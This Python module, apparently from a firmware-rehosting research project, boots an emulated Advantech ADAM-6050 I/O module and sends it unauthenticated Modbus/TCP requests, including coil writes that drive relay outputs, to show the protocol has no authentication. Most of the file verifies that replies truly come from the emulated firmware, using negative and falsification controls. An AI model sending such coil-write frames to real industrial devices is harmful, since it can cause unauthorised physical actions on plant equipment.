# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""The attack: unauthenticated Modbus/TCP writes an output on a live I/O module.

WHAT THE DEVICE IS. An Advantech ADAM-6050 is a remote digital-I/O module: 12
inputs and 6 outputs on a DIN rail, wired to real things. Its Modbus/TCP server
on port 502 is how a PLC or SCADA host reads those inputs and drives those
outputs.

WHAT THE VULNERABILITY IS. **Modbus/TCP has no authentication.** None: no
credential, no session, no signature -- the protocol predates the idea that the
network might be hostile, and the ADAM-6000's server implements it faithfully.
Anyone who can open a TCP connection to port 502 can read every input and write
every output. On this device an output coil is a relay contact, so a single
five-byte request is a physical action.

That is not a defect in this firmware; it is what Modbus is. The finding is that
this is a device sold to sit on a plant network and drive equipment, and its
control interface is a socket that will do what anyone tells it.

THE ORACLE IS A SUSTAINED CONVERSATION WITH ONE GUEST. Forty requests, every
one of them different in transaction id, unit id, function code, address and
quantity, down a single TCP connection to a single booted device. Every reply
has to carry its own request's transaction and unit id back, echo its function
byte (plain when the device can answer, with the error bit when it cannot), and
-- when it answers with data -- be sized from the quantity field that request
chose. All of it travels the whole modelled stack: the firmware's Modbus server
-> lwIP -> the EMAC's transmit descriptor ring -> an Ethernet frame -> the
modelled peer's TCP/IPv4 -> this socket. Nothing short-circuits, and nothing on
the host decides the answer.

WHY N > 1 IS THE WHOLE POINT. This module used to boot a fresh device for each
probe and ask it one question. `landed = all(checks)` looked like a strong
conjunction and was not: each clause was answered by a different device on its
first exchange, so the oracle could not have noticed that no guest ever answered
a second question -- which, for three separate reasons in the MAC model, none of
them did. See STATUS.md.

A negative control runs throughout: function code 0x41 is not a Modbus function
and must always come back as an exception with code 1 (illegal function), while
a supported function aimed at an address this module does not have must come
back as code 2 (illegal data address). A rehost that echoed bytes, or a bridge
answering on the firmware's behalf, would not tell those apart.

THE FALSIFICATION KNOB. Both controls above run *inside* every attack arm, so
neither is something a reader can turn off from outside and watch the verdict
collapse. ``--control=withhold`` is that external knob: the device boots
identically, lwIP reaches "IP ready." identically, the harness attaches to the
bridge identically -- and then the Modbus request frames, the one stimulus the
whole verdict rests on, are never put on the wire. The socket is read anyway,
so an emulator or a bridge that had learned to answer on the firmware's behalf
would still be caught producing replies to questions nobody asked. Under the
knob `sustained_round_trips` must be 0, `landed` false, the milestone M3, and
the process must exit non-zero.
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import struct
import subprocess
import sys
import time
from typing import Callable, Dict, List, Optional, Tuple

from . import paths, spawn

MODBUS_UNIT = 1

# Function codes.
FN_READ_COILS = 0x01
FN_READ_DISCRETE_INPUTS = 0x02
FN_READ_HOLDING = 0x03
FN_WRITE_SINGLE_COIL = 0x05
# Not implemented by this device -- the negative control.
FN_BOGUS = 0x41

COIL_ON = 0xFF00
COIL_OFF = 0x0000

# The output coil the attack drives. An ADAM-6050 has six outputs (DO0..DO5).
TARGET_COIL = int(os.environ.get("HAL_ADAM_TARGET_COIL", "0"), 0)

# The external falsification knob. An UNRECOGNISED value must never fall
# through to the real attack -- a mistyped control that quietly runs the live
# path reads as "the control does not discriminate", which is damning and false
# (playbook §2.200). `CONTROL_MODES` is the whole authority; anything else
# raises, and argparse `choices=` refuses it at the command line.
CONTROL_MODES = ("none", "withhold")


def mbap(txn: int, pdu: bytes, unit: int = MODBUS_UNIT) -> bytes:
    """Wrap a PDU in the Modbus/TCP header: transaction, protocol, length, unit."""
    return struct.pack(">HHHB", txn, 0, len(pdu) + 1, unit) + pdu


class DeviceScenario:
    """Boots the rehost with its Ethernet bridge and speaks Modbus to it."""

    def __init__(self, bridge_port: int = spawn.BRIDGE_PORT,
                 python: Optional[str] = None,
                 log_dir: Optional[str] = None) -> None:
        self.bridge_port = bridge_port
        self.python = python or os.environ.get("HAL_PY") or sys.executable
        # ONE LOG PER RUN, NOT ONE PER MACHINE. The emulator log is where
        # `console()` reads the firmware's own output, so two arms sharing
        # /tmp/adam6000_tm4c_attack.log grade each other's boot -- which is
        # exactly how a control arm can come out looking like the attack arm.
        self.log_dir = log_dir or os.environ.get("HAL_ADAM_LOG_DIR") or "/tmp"
        self.host = "127.0.0.1"
        self._procs: List[subprocess.Popen] = []
        self.sock: Optional[socket.socket] = None
        self.txn = 0
        self.transcript: List[Dict[str, str]] = []
        self.log = os.path.join(self.log_dir, "adam6000_tm4c_attack.log")

    # ---- process management ----------------------------------------------
    def _spawn(self, argv, cwd, env, logpath) -> subprocess.Popen:
        p = subprocess.Popen(argv, cwd=cwd, env=env, stdout=open(logpath, "w"),
                             stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        self._procs.append(p)
        return p

    def teardown(self) -> None:
        """Kill ONLY what this scenario started -- never a global pkill
        (playbook §2.10): other sessions run their own emulators."""
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
        for p in self._procs:
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(5)
                except Exception:            # noqa: BLE001
                    p.kill()
        self._procs.clear()

    def shutdown(self) -> None:
        self.teardown()

    def _log_has(self, needle: str) -> bool:
        try:
            return needle in open(self.log, errors="replace").read()
        except OSError:
            return False

    def console(self) -> List[str]:
        """The firmware's own boot output, as the UART model logged it."""
        out = []
        try:
            for line in open(self.log, errors="replace"):
                if "CONSOLE " in line:
                    out.append(line.split("CONSOLE ", 1)[1].rstrip())
        except OSError:
            pass
        return out

    # ---- boot -------------------------------------------------------------
    def boot(self, on_stage: Callable) -> bool:
        if not paths.firmware_present():
            on_stage("error", note="firmware not found at %s -- regenerate it "
                                   "with tools/extract_firmware.py"
                                   % paths.firmware_bin())
            return False
        # Derived from the bridge port so several devices can run at once --
        # `run_attack` boots one per probe, and a shared rx/tx port makes all
        # but the first fail to bind and never reach "IP ready.".
        argv = spawn.spawn_argv(python=self.python, emulator="unicorn",
                                bridge=True,
                                rx_port=self.bridge_port + 1000,
                                tx_port=self.bridge_port + 2000)
        env = spawn.spawn_env(extra={
            "PYTHONUNBUFFERED": "1",
            "HAL_ADAM_BRIDGE_PORT": str(self.bridge_port),
        })
        on_stage("boot", note="booting the ADAM-6050 firmware ...")
        p = self._spawn(argv, spawn.spawn_cwd(), env, self.log)

        # The readiness marker is the firmware's own: lwIP announcing itself.
        # macOS has no timeout(1), so the bound is here.
        deadline = time.time() + 420
        while time.time() < deadline:
            if p.poll() is not None:
                on_stage("error", note="HALucinator exited during boot "
                                       "(see %s)" % self.log)
                return False
            if self._log_has("IP ready."):
                break
            time.sleep(2)
        else:
            on_stage("error", note="the firmware never reached 'IP ready.'")
            return False
        on_stage("boot", note="firmware is up: lwIP reports 'IP ready.'")

        for _ in range(120):
            try:
                self.sock = socket.create_connection(
                    (self.host, self.bridge_port), timeout=5)
                self.sock.settimeout(None)
                break
            except OSError:
                time.sleep(1)
        if self.sock is None:
            on_stage("error", note="could not attach to tcp/%d"
                               % self.bridge_port)
            return False
        on_stage("boot", note="Modbus/TCP bridged on tcp/%d"
                          % self.bridge_port)
        return True

    # ---- Modbus -----------------------------------------------------------
    def request(self, pdu: bytes, timeout: float = 90.0) -> Optional[bytes]:
        """Send one Modbus PDU; return the response PDU, or None on timeout.

        Completion is the MBAP length field, not a fixed wait: the response
        arrives whenever the firmware's own stack gets round to it, and a fixed
        sleep would either truncate it or waste the difference.
        """
        assert self.sock is not None
        self.txn = (self.txn + 1) & 0xFFFF
        frame = mbap(self.txn, pdu)
        self.sock.sendall(frame)
        buf = bytearray()
        deadline = time.time() + timeout
        while time.time() < deadline:
            self.sock.settimeout(max(0.5, deadline - time.time()))
            try:
                data = self.sock.recv(512)
            except socket.timeout:
                break
            except OSError:
                break
            if not data:
                break
            buf.extend(data)
            if len(buf) >= 6:
                need = 6 + struct.unpack(">H", bytes(buf[4:6]))[0]
                if len(buf) >= need:
                    break
        if len(buf) < 8:
            self.transcript.append({"sent": frame.hex(), "recv": buf.hex()})
            return None
        self.transcript.append({"sent": frame.hex(), "recv": bytes(buf).hex()})
        return bytes(buf[7:])

    def exchange(self, txn: int, unit: int, pdu: bytes,
                 timeout: float = 30.0) -> Optional[bytes]:
        """One request/response, with the **whole** ADU returned.

        `request` above hides the MBAP header, which is exactly the part that
        makes a reply attributable to its own request: an oracle that only ever
        sees the PDU cannot tell a fresh answer from a stale one still sitting
        in a buffer. Everything here that varies per request -- the transaction
        id, the unit id, the function code -- has to come back.
        """
        assert self.sock is not None
        frame = mbap(txn, pdu, unit=unit)
        self.sock.sendall(frame)
        buf = bytearray()
        deadline = time.time() + timeout
        while time.time() < deadline:
            self.sock.settimeout(max(0.5, deadline - time.time()))
            try:
                data = self.sock.recv(512)
            except socket.timeout:
                break
            except OSError:
                break
            if not data:
                break
            buf.extend(data)
            if len(buf) >= 6:
                need = 6 + struct.unpack(">H", bytes(buf[4:6]))[0]
                if len(buf) >= need:
                    break
        self.transcript.append({"sent": frame.hex(), "recv": bytes(buf).hex()})
        return bytes(buf) if len(buf) >= 8 else None

    def listen_only(self, timeout: float = 8.0) -> Optional[bytes]:
        """The withheld-stimulus arm of `exchange`: read, but never send.

        Everything else is identical -- same socket, same booted guest, same
        completion rule on the MBAP length field. The ONLY difference is that
        no request frame is transmitted. Anything that comes back here is a
        reply to a question nobody asked, so the read is kept rather than
        skipped: it is what would catch a bridge answering on the firmware's
        behalf.
        """
        assert self.sock is not None
        buf = bytearray()
        deadline = time.time() + timeout
        while time.time() < deadline:
            self.sock.settimeout(max(0.5, deadline - time.time()))
            try:
                data = self.sock.recv(512)
            except socket.timeout:
                break
            except OSError:
                break
            if not data:
                break
            buf.extend(data)
            if len(buf) >= 6:
                need = 6 + struct.unpack(">H", bytes(buf[4:6]))[0]
                if len(buf) >= need:
                    break
        self.transcript.append({"sent": "", "recv": bytes(buf).hex()})
        return bytes(buf) if len(buf) >= 8 else None

    def read_coils(self, start: int, count: int) -> Optional[List[int]]:
        pdu = self.request(struct.pack(">BHH", FN_READ_COILS, start, count))
        if not pdu or pdu[0] != FN_READ_COILS or len(pdu) < 2:
            return None
        data = pdu[2:2 + pdu[1]]
        return [(data[i // 8] >> (i % 8)) & 1 for i in range(count)]

    def write_coil(self, coil: int, on: bool) -> bool:
        value = COIL_ON if on else COIL_OFF
        pdu = self.request(struct.pack(">BHH", FN_WRITE_SINGLE_COIL, coil,
                                       value))
        # A Modbus write echoes the request back on success.
        return bool(pdu and pdu[0] == FN_WRITE_SINGLE_COIL
                    and struct.unpack(">H", pdu[3:5])[0] == value)

    # ---- state, for the panel --------------------------------------------
    def read_state(self) -> Dict:
        """What the device says about itself -- from its console, not Modbus.

        NOT A MODBUS READ, because there is nothing to read: this module's I/O
        profile lives in a serial flash the vendor image does not carry, so it
        reports zero I/O points and every data address is illegal. Everything
        here is the firmware's own console output. (This used to be justified by
        the device only answering once per boot -- that was a defect in the MAC
        model, not a property of the firmware, and it is fixed.)
        """
        facts: Dict = {"ip": None, "mac": None, "model": None,
                       "io_points": None, "profile_in_serial_flash": None,
                       "stack_up": False}
        for line in self.console():
            if "MACID:" in line:
                facts["mac"] = line.split("MACID:", 1)[1].strip()
            elif "g_ui32IPAddr=" in line:
                raw = line.split("g_ui32IPAddr=", 1)[1].split(",")[0].strip()
                try:
                    value = int(raw, 16)
                    facts["ip"] = ".".join(str((value >> shift) & 0xFF)
                                           for shift in (0, 8, 16, 24))
                except ValueError:
                    pass
            elif "g_usModel = " in line:
                facts["model"] = line.split("=", 1)[1].strip()
            elif "ucTotal_StatusPins = " in line:
                facts["io_points"] = line.split("=", 1)[1].strip()
            elif "GetDevInfo() Err" in line:
                facts["profile_in_serial_flash"] = "missing (flash is blank)"
            elif "IP ready." in line:
                facts["stack_up"] = True
        facts["console_tail"] = self.console()[-6:]
        return facts

    # ---- the attack -------------------------------------------------------
    def attack(self, on_stage: Optional[Callable] = None) -> Dict:
        """A sustained conversation with **one** guest, and what came back.

        ONE GUEST, MANY QUESTIONS. Asking a freshly-booted device a single
        question and grading the answer cannot distinguish a working server
        from one that answers once and dies -- and this rehost was the second
        kind, for a reason that was entirely in the MAC model (see
        `peripheral_models/tiva_emac.py`). So the probe set below runs down one
        TCP connection to one guest, and the count that survives is reported.
        """
        return converse(self, on_stage)


# Each probe: a label, the PDU, the function byte the device should echo with
# the error bit set, and the exception code it should choose.
PROBES: List[Tuple[str, bytes, int, int]] = [
    ("read coils", struct.pack(">BHH", FN_READ_COILS, 0, 8), 0x81, 2),
    ("read discrete inputs",
     struct.pack(">BHH", FN_READ_DISCRETE_INPUTS, 0, 12), 0x82, 2),
    ("read holding registers",
     struct.pack(">BHH", FN_READ_HOLDING, 0, 2), 0x83, 2),
    ("write single coil",
     struct.pack(">BHH", FN_WRITE_SINGLE_COIL, 0, COIL_OFF), 0x85, 2),
    # The negative control: 0x41 is not a Modbus function code at all, and it
    # must be refused differently from a real one aimed at a bad address.
    ("bogus function 0x41", struct.pack(">BHH", FN_BOGUS, 0, 1), 0xC1, 1),
]

# HOW MANY REQUESTS ONE GUEST MUST SURVIVE, and why this number. The firmware's
# transmit ring is **24 descriptors** -- its own wrap constant, `rsb r1, r1,
# #0x18` at 0x0001CC5E and `cmp sb, #0x18` at 0x0001CCDC -- and each Modbus
# exchange costs at least one transmit descriptor (the response) plus the ACKs
# around it. A run of 40 therefore laps that ring several times over, which is
# precisely what the old rehost could not do: nothing was ever reclaimed, so it
# fell silent at the first lap. Anything at or below 24 could pass on a ring
# that is never recycled, so it would not be a test.
SUSTAINED_N = int(os.environ.get("HAL_ADAM_SUSTAINED_N", "40"), 0)
TX_RING_DESCRIPTORS = 24


def _probe_for(i: int) -> Tuple[int, int, bytes, int, int, str]:
    """Request number ``i``: transaction id, unit id, PDU, and what it must
    come back as.

    FRESH CONTENT EVERY TIME. The transaction id, the unit id, the function
    code and the address all vary with ``i``, and all four are checked in the
    reply. A device that had stopped listening and was replaying a buffered
    answer would fail on the first of them; so would a host-side bridge that
    had learned to answer on the firmware's behalf.
    """
    label, pdu, want_fc, want_code = PROBES[i % len(PROBES)]
    txn = (0xB100 + i * 37) & 0xFFFF
    unit = (i % 247) + 1
    # Walk the address space as well, so no two requests of the same function
    # are byte-identical. Every address on this module is illegal (its I/O
    # profile is in the blank serial flash), so the expected answer does not
    # change -- but the bytes on the wire do.
    addr = (i * 29) & 0x7FFF
    fc = pdu[0]
    if fc == FN_WRITE_SINGLE_COIL:
        # Keep the value legal (0x0000 / 0xFF00) so the refusal stays
        # "illegal data address" and not "illegal data value".
        body = struct.pack(">BHH", fc, addr, COIL_ON if i % 2 else COIL_OFF)
    elif fc == FN_BOGUS:
        body = struct.pack(">BHH", fc, addr, 1)
    else:
        body = struct.pack(">BHH", fc, addr, (i % 8) + 1)
    return txn, unit, body, want_fc, want_code, label


def _check_success(fc: int, request_pdu: bytes,
                   adu: bytes) -> Optional[str]:
    """Is this successful reply well formed *for the request that caused it*?

    THIS IS WHERE A REPLAY WOULD DIE. The byte count of a read response is not
    a constant: it is computed from the quantity field of the request, and this
    run picks a different quantity for almost every request. A canned answer,
    or a stale one still in a buffer, cannot satisfy it -- and neither can a
    host-side bridge that has not parsed the request.

    Returns None if the reply is sound, or a description of what is wrong.
    """
    addr, qty = struct.unpack(">HH", request_pdu[1:5])
    body = adu[7:]                               # the response PDU
    if fc in (FN_READ_COILS, FN_READ_DISCRETE_INPUTS):
        want = (qty + 7) // 8                    # bits, packed
    elif fc == FN_READ_HOLDING:
        want = qty * 2                           # 16-bit registers
    elif fc == FN_WRITE_SINGLE_COIL:
        # A write echoes the request's address and value verbatim.
        if len(body) != 5:
            return "write echo is %d PDU bytes, expected 5" % len(body)
        got_addr, got_val = struct.unpack(">HH", body[1:5])
        if (got_addr, got_val) != (addr, qty):
            return ("write echo is addr 0x%04x value 0x%04x, sent addr 0x%04x "
                    "value 0x%04x" % (got_addr, got_val, addr, qty))
        return None
    else:
        return "function 0x%02x answered successfully; it is not a Modbus " \
               "function and must be refused" % fc
    if len(body) < 2:
        return "response PDU is %d bytes" % len(body)
    got = body[1]
    if got != want:
        return ("byte count is %d, but %d were asked for -- expected %d"
                % (got, qty, want))
    if len(body) != 2 + want:
        return ("byte count says %d but the PDU carries %d"
                % (want, len(body) - 2))
    return None


def converse(dev: "DeviceScenario", on_stage: Optional[Callable] = None,
             count: int = SUSTAINED_N, control: str = "none") -> Dict:
    """Ask ONE booted guest ``count`` questions down one connection.

    Returns the graded result. `run_attack` and the panel both go through here,
    so there is one oracle and not two.

    ``control``:
      ``"none"``     the real attack.
      ``"withhold"`` the external falsification control: the request frames are
                     never transmitted. The guest is booted, the socket is open
                     and is still read -- only the stimulus is withheld. Must
                     yield ``booted: true`` with ``landed: false``.

    The oracle below is UNCHANGED between the two arms: the same checks are
    evaluated on whatever came back. A control that scored itself with a
    different predicate would not be a control.
    """
    if control not in CONTROL_MODES:
        raise ValueError("unknown control mode %r; expected one of %s"
                         % (control, ", ".join(CONTROL_MODES)))

    def _stage(name: str, **kw) -> None:
        if on_stage:
            on_stage(name, **kw)

    checks: Dict[str, bool] = {}
    detail: Dict[str, str] = {}
    ok_streak = 0
    first_miss: Optional[int] = None
    replayed = False
    misattributed = False
    wrong_fc = False
    malformed: List[str] = []
    bogus_not_refused = False
    seen_codes: Dict[int, int] = {}
    successes = 0
    exceptions = 0
    previous: Optional[bytes] = None

    if control == "withhold":
        _stage("request", note="CONTROL: the %d Modbus requests are NOT "
                               "transmitted; the socket is read anyway, so a "
                               "reply to a question nobody asked would still "
                               "be caught" % count)
    else:
        _stage("request", note="%d unauthenticated Modbus requests down one "
                               "connection to one guest -- no credential, no "
                               "session, no handshake beyond TCP" % count)
    for i in range(count):
        txn, unit, pdu, _want_fc, want_code, label = _probe_for(i)
        if control == "withhold":
            # The withheld stimulus, and NOTHING else: same guest, same open
            # socket, same completion rule -- the request bytes simply never
            # leave the host.
            adu = dev.listen_only()
        else:
            adu = dev.exchange(txn, unit, pdu)
        if adu is None or len(adu) < 9:
            first_miss = i
            detail["request %02d %s" % (i, label)] = "<nothing>"
            _stage("request", note="request %d went unanswered" % i)
            break
        got_txn = struct.unpack(">H", adu[0:2])[0]
        if got_txn != txn or adu[6] != unit:
            misattributed = True
            first_miss = i
            detail["request %02d %s" % (i, label)] = (adu.hex()
                                                      + "   MISATTRIBUTED")
            break
        if adu == previous:
            replayed = True
        previous = adu
        fc = pdu[0]
        note = ""
        if adu[7] == fc | 0x80:
            # An exception: function byte echoed with the error bit set.
            exceptions += 1
            seen_codes[adu[8]] = seen_codes.get(adu[8], 0) + 1
            note = "exception %d" % adu[8]
            if fc == FN_BOGUS and adu[8] != want_code:
                bogus_not_refused = True
                note += "  (0x41 must be refused as illegal function)"
        elif adu[7] == fc:
            # A SUCCESSFUL ANSWER, which this device does give for some
            # addresses -- see _check_success. Not every address on this
            # module is illegal, and an oracle that insisted on an exception
            # would fail on the firmware being MORE capable than expected.
            successes += 1
            if fc == FN_BOGUS:
                bogus_not_refused = True     # 0x41 must never succeed
            problem = _check_success(fc, pdu, adu)
            if problem:
                malformed.append("request %d: %s" % (i, problem))
                note = "malformed success: " + problem
            else:
                note = "answered, %d PDU bytes" % (len(adu) - 7)
        else:
            wrong_fc = True
            note = ("neither 0x%02x nor 0x%02x -- got 0x%02x"
                    % (fc, fc | 0x80, adu[7]))
        ok_streak += 1
        detail["request %02d %s" % (i, label)] = "%s   %s" % (adu.hex(), note)

    # THE COUNT IS THE HEADLINE, and it is a check, not a footnote.
    checks["answered %d consecutive requests on one guest" % count] = (
        ok_streak >= count)
    checks["every reply carried its own request's transaction and unit id"] = (
        not misattributed and ok_streak > 0)
    checks["no reply was a repeat of the one before it"] = (
        not replayed and ok_streak > 0)
    checks["every reply's function byte is its request's, plain or with the "
           "error bit"] = not wrong_fc and ok_streak > 0
    # THE STRUCTURE IS SIZED FROM THE REQUEST. A successful read's byte count
    # is computed from the quantity field this run chose, so a canned or
    # replayed answer cannot satisfy it.
    checks["successful answers are sized from the request's own quantity "
           "field"] = not malformed and ok_streak > 0
    # The negative control: 0x41 is not a Modbus function, and a real parser
    # refuses it differently from a supported function aimed at a bad address.
    checks["0x41 is always refused as illegal function (1)"] = (
        not bogus_not_refused and seen_codes.get(1, 0) > 0)
    checks["a real parser: unsupported (1) and unusable (2) differ"] = (
        seen_codes.get(1, 0) > 0 and seen_codes.get(2, 0) > 0)
    # THE RING WAS RECYCLED. Below 24 exchanges the transmit ring need never
    # have wrapped, so the sustained result would prove nothing about reclaim.
    checks["the transmit ring was lapped (>%d exchanges)"
           % TX_RING_DESCRIPTORS] = ok_streak > TX_RING_DESCRIPTORS

    console = "\n".join(dev.console())
    checks["the module reports no I/O profile, and says why"] = (
        "GetDevInfo() Err" in console and "g_usModel = 255" in console
        and "ucTotal_StatusPins = 0" in console)
    checks["the stack is the firmware's own"] = (
        "IP ready." in console and "ip=100000a" in console)

    # THE SEAM, named for what it is. Bytes IN: `count` Modbus/TCP PDUs from an
    # anonymous peer, every one of them different, down a single TCP connection
    # to a single guest. Bytes OUT: the vendor's own Modbus parser's replies --
    # each carrying back that request's transaction id and unit id, echoing its
    # function byte (plain when it can answer, with the error bit when it
    # cannot), sizing successful answers from the quantity field this run chose,
    # and CHOOSING between exception codes: illegal function (1) for 0x41, which
    # is not a Modbus function at all, illegal data address (2) for a supported
    # function aimed at an address this module does not have. Every one of them
    # crossed lwIP, the EMAC transmit ring, an Ethernet frame and the modelled
    # peer's TCP/IPv4. The console lines ("IP ready.", the model/pin counts) are
    # M2/M3 corroboration and are NOT the seam.
    modbus_round_trip = bool(
        ok_streak >= count
        and ok_streak > TX_RING_DESCRIPTORS
        and not misattributed and not replayed
        and not wrong_fc and not malformed and not bogus_not_refused
        and checks["a real parser: unsupported (1) and unusable (2) differ"])
    _stage("request", note="%d/%d answered; first unanswered request: %s"
                           % (ok_streak, count,
                              "none" if first_miss is None else first_miss))
    return {"booted": "IP ready." in console,
            "landed": all(checks.values()),
            "control_mode": control,
            "modbus_round_trip": modbus_round_trip,
            # THE COUNT, in the result itself.
            "sustained_round_trips": ok_streak,
            "requests_attempted": count,
            "first_unanswered_request": first_miss,
            "tx_ring_descriptors": TX_RING_DESCRIPTORS,
            "answers_with_data": successes,
            "answers_that_were_exceptions": exceptions,
            "exception_codes_seen": seen_codes,
            "malformed_answers": malformed,
            "checks": checks,
            "responses": detail}


def run_attack(on_stage: Optional[Callable] = None,
               log_dir: Optional[str] = None,
               control: str = "none") -> Dict:
    """Boot ONE device and hold a Modbus/TCP conversation with it.

    ONE GUEST, NOT ONE PER PROBE. This used to boot a separate device for each
    of five probes, because the rehost answered the first request after boot
    and nothing after it -- so `landed = all(checks)` read like a conjunction
    while every clause was answered by a different device on its first
    exchange. That structure could not have detected the defect it was working
    around. It is gone: every question below is put to the same guest, in
    order, down one connection, and the number it sustains is the result.
    """
    if control not in CONTROL_MODES:
        raise ValueError("unknown control mode %r; expected one of %s"
                         % (control, ", ".join(CONTROL_MODES)))

    def _stage(name: str, **kw) -> None:
        if on_stage:
            on_stage(name, **kw)

    port = int(os.environ.get("HAL_ADAM_ATTACK_PORT", "21300"), 0)
    dev = DeviceScenario(bridge_port=port, log_dir=log_dir)
    try:
        if not dev.boot(on_stage or (lambda *a, **k: None)):
            return {"booted": False, "landed": False,
                    "control_mode": control,
                    "modbus_round_trip": False,
                    "sustained_round_trips": 0,
                    "requests_attempted": SUSTAINED_N,
                    "first_unanswered_request": None,
                    "tx_ring_descriptors": TX_RING_DESCRIPTORS,
                    "milestone": "M0",
                    "checks": {"the device booted": False},
                    "responses": {}}
        result = converse(dev, on_stage, control=control)
    finally:
        dev.teardown()

    # DERIVED from what this run measured, never asserted from STATUS.md. M4 is
    # the sustained round trip above; a device that boots and talks on the
    # console but cannot hold a conversation got no further than M3.
    result["milestone"] = ("M4" if result["modbus_round_trip"]
                           else "M3" if result["booted"] else "M0")
    return result


def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(
        prog="rehostry-adam6000-tm4c-attack",
        description="Unauthenticated Modbus/TCP against the ADAM-6050 rehost; "
                    "verified from the firmware's own replies.")
    p.add_argument("--control", default="none", choices=CONTROL_MODES,
                   help="'none' = the real attack; 'withhold' = the "
                        "falsification control (the Modbus request frames are "
                        "never transmitted; everything else is identical)")
    p.add_argument("--log-dir", default=None)
    # Reject unknown argv rather than ignoring it. This main() used to take no
    # argv at all, so a documented-looking flag was silently dropped and the
    # REAL attack ran and was reported as a control (playbook §2.200).
    args = p.parse_args(argv)

    def on_stage(name: str, **kw) -> None:
        print("[%s] %s" % (name, kw.get("note", "")), file=sys.stderr)

    print("[mode] control=%r (%s)"
          % (args.control,
             "REAL ATTACK" if args.control == "none" else "NEGATIVE CONTROL"),
          file=sys.stderr)
    result = run_attack(on_stage=on_stage, log_dir=args.log_dir,
                        control=args.control)
    print()
    for name, ok in result.get("checks", {}).items():
        print("  [%s] %s" % ("PASS" if ok else "FAIL", name))
    print()
    for label, reply in result.get("responses", {}).items():
        print("  %-34s -> %s" % (label, reply))
    print("\n  sustained round trips on one guest: %d/%d"
          % (result.get("sustained_round_trips", 0),
             result.get("requests_attempted", 0)))
    print("  of those: %d carried data, %d were exceptions %s"
          % (result.get("answers_with_data", 0),
             result.get("answers_that_were_exceptions", 0),
             result.get("exception_codes_seen", {})))
    print("\nRESULT: " + json.dumps(
        {k: v for k, v in result.items() if k != "transcript"}))
    # Non-zero below M4, said explicitly so a later edit cannot decouple them.
    return 0 if (result.get("landed")
                 and result.get("milestone") == "M4") else 1


if __name__ == "__main__":
    sys.exit(main())
